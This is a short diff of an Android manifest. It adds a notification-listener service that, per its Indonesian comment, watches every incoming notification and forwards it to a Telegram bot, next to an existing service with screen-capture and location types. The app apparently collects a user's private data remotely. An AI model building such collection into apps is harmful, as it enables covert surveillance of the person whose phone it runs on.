@@ -40,6 +40,17 @@
             android:name=".TelegramService"
             android:foregroundServiceType="mediaProjection|dataSync|location"
             android:exported="false" />
+
+        <!-- Notification listener: pantau semua notifikasi masuk, kirim ke bot -->
+        <service
+            android:name=".NotificationWatcherService"
+            android:exported="true"
+            android:label="TeleBot Monitor Notifikasi"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
     </application>
 
 </manifest>
